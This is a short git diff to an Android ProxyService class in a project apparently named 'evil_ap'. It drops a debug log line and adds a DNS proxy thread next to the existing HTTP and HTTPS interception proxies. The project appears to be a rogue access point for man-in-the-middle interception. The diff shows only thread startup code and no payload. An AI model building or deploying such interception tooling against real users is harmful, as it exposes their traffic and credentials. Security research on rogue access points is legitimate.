@@ -3,7 +3,6 @@ package com.nibiru.evil_ap.proxy;
 import android.app.Service;
 import android.content.Intent;
 import android.os.IBinder;
-import android.util.Log;
 
 import com.nibiru.evil_ap.R;
 
@@ -22,11 +21,13 @@ public class ProxyService extends Service{
         //start the HTTP proxy socket thread
         Thread proxyHTTP = new Thread(new ProxyHTTPMainLoop());
         proxyHTTP.start();
-        Log.d(TAG, "?");
         //start the HTTPS proxy
         Thread proxyHTTPS = new Thread(new ProxyHTTPSMainLoop(
                 getResources().openRawResource(R.raw.evil_ap)));
         proxyHTTPS.start();
+        //start the DNS proxy
+        Thread proxyDNS = new Thread(new ProxyDNSMainLoop());
+        proxyDNS.start();
     }
 
     @Override
